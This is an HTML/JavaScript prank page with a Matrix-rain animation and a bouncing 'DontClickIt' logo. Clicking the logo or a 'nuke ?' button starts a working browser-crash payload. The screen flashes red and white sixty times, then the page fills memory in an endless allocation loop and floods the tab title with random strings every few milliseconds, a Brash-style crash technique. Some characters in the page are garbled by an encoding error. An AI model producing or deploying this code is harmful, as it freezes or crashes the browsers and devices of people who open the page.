<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix + DontClickIt</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
            color: green;
            font-family: monospace;
        }
        canvas {
            display: block;
        }
        #logo {
            position: absolute;
            pointer-events: auto;
            cursor: pointer;
            user-select: none;
            image-rendering: pixelated;
            width: 220px;
            z-index: 10;
        }
        #crash-overlay {
            position: fixed;
            inset: 0;
            background: red;
            color: white;
            font-size: 5.5vw;
            font-weight: bold;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 9999;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.2s;
        }
        #crash-gif {
            width: 75vmin;
            max-width: 700px;
            height: auto;
            margin-bottom: 40px;
            border: 5px solid #fff;
            box-shadow: 0 0 40px #ff2222, 0 0 80px #ff0000;
            animation: explode 1.5s ease-in-out infinite alternate;
        }
        @keyframes explode {
            0% {
                transform: scale(1) rotate(0deg);
                opacity: 1;
            }
            50% {
                transform: scale(1.2) rotate(5deg);
                opacity: 0.8;
                filter: brightness(1.5) contrast(1.2);
            }
            100% {
                transform: scale(1.4) rotate(-5deg);
                opacity: 0.6;
                filter: brightness(2) contrast(1.5) blur(2px);
            }
        }
        #nuke-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 24px;
            background: #ff4444;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border: 2px solid #fff;
            border-radius: 8px;
            cursor: pointer;
            z-index: 20;
            transition: background 0.3s, transform 0.3s;
        }
        #nuke-button:hover {
            background: #ff0000;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png">

    <div id="crash-overlay">
        <img id="crash-gif" src="https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif" alt="NUCLEAR">
        bye bye ram ‚Ä¶ and cpu
    </div>

    <button id="nuke-button">nuke ?</button>

    <script>
        const canvas = document.getElementById("matrixCanvas");
        const ctx = canvas.getContext("2d");
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const katakana = "„Ç¢„Ç§„Ç¶„Ç®„Ç™„Ç´„Ç≠„ÇØ„Ç±„Ç≥„Çµ„Ç∑„Çπ„Çª„ÇΩ„Çø„ÉÅ„ÉÑ„ÉÜ„Éà„Éä„Éã„Éå„Éç„Éé„Éè„Éí„Éï„Éò„Éõ„Éû„Éü„É†„É°„É¢„É§„É¶„É®„É©„É™„É´„É¨„É≠„ÉØ„É≤„É≥";
        const latin = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const nums = "0123456789";
        const alphabet = katakana + latin + nums;

        const fontSize = 16;
        let columns = Math.floor(canvas.width / fontSize);
        let drops = Array(columns).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0";
            ctx.font = `${fontSize}px monospace`;
            for (let i = 0; i < drops.length; i++) {
                const text = alphabet[Math.floor(Math.random() * alphabet.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 50);

        const logo = document.getElementById("logo");
        const overlay = document.getElementById("crash-overlay");

        let x = Math.random() * (window.innerWidth - 260) + 20;
        let y = Math.random() * (window.innerHeight - 140) + 20;
        let dx = (Math.random() > 0.5 ? 1 : -1) * (2.2 + Math.random() * 1.4);
        let dy = (Math.random() > 0.5 ? 1 : -1) * (2.2 + Math.random() * 1.4);

        function updateLogo() {
            const w = logo.offsetWidth;
            const h = logo.offsetHeight;
            x += dx;
            y += dy;

            if (x <= 0 || x + w >= window.innerWidth) {
                dx = -dx;
                x = Math.max(0, Math.min(x, window.innerWidth - w));
            }
            if (y <= 0 || y + h >= window.innerHeight) {
                dy = -dy;
                y = Math.max(0, Math.min(y, window.innerHeight - h));
            }

            logo.style.left = `${x}px`;
            logo.style.top = `${y}px`;

            requestAnimationFrame(updateLogo);
        }

        requestAnimationFrame(updateLogo);

        const titleStrings = [];
        for (let i = 0; i < 120; i++) {
            let str = '';
            for (let j = 0; j < 512; j++) {
                str += Math.random().toString(16)[2];
            }
            titleStrings.push(str);
        }

        function startBrashExploit() {
            let counter = 0;
            const brashInterval = setInterval(() => {
                for (let burst = 0; burst < 80; burst++) {
                    document.title = titleStrings[counter % titleStrings.length] + " üíÄ BYE";
                    counter++;
                }
                if (Math.random() > 0.92) {
                    document.title = "crash in progress...";
                }
                if (counter > 500000) {
                    clearInterval(brashInterval);
                }
            }, 4);
        }

        function triggerCrash() {
            let flashCount = 0;
            const maxFlashes = 60;
            const flashIntervalMs = 750;

            const interval = setInterval(() => {
                if (flashCount % 2 === 0) {
                    overlay.style.background = "red";
                } else {
                    overlay.style.background = "white";
                }
                overlay.style.opacity = "1";

                flashCount++;

                if (flashCount >= maxFlashes) {
                    clearInterval(interval);
                    overlay.style.background = "red";
                    overlay.style.opacity = "0.96";

                    setTimeout(() => {
                        try {
                            let memHog = [];
                            while (true) {
                                memHog.push(new Array(1000000).fill(Math.random() * 999999));
                            }
                        } catch (e) {}
                    }, 300);

                    setTimeout(() => {
                        startBrashExploit();
                    }, 800);
                }
            }, flashIntervalMs);
        }

        logo.addEventListener("click", triggerCrash);

        const nukeButton = document.getElementById("nuke-button");
        nukeButton.addEventListener("click", () => {
            nukeButton.style.display = "none";
            overlay.style.opacity = "1";
            document.getElementById("crash-gif").style.animation = "explode 1.5s ease-in-out 1";
            setTimeout(triggerCrash, 1600);
        });

        window.addEventListener("resize", () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const newColumns = Math.floor(canvas.width / fontSize);
            if (newColumns > columns) {
                drops = drops.concat(Array(newColumns - columns).fill(1));
            } else if (newColumns < columns) {
                drops = drops.slice(0, newColumns);
            }
            columns = newColumns;

            x = Math.max(0, Math.min(x, window.innerWidth - logo.offsetWidth));
            y = Math.max(0, Math.min(y, window.innerHeight - logo.offsetHeight));
        });
    </script>
</body>
</html>
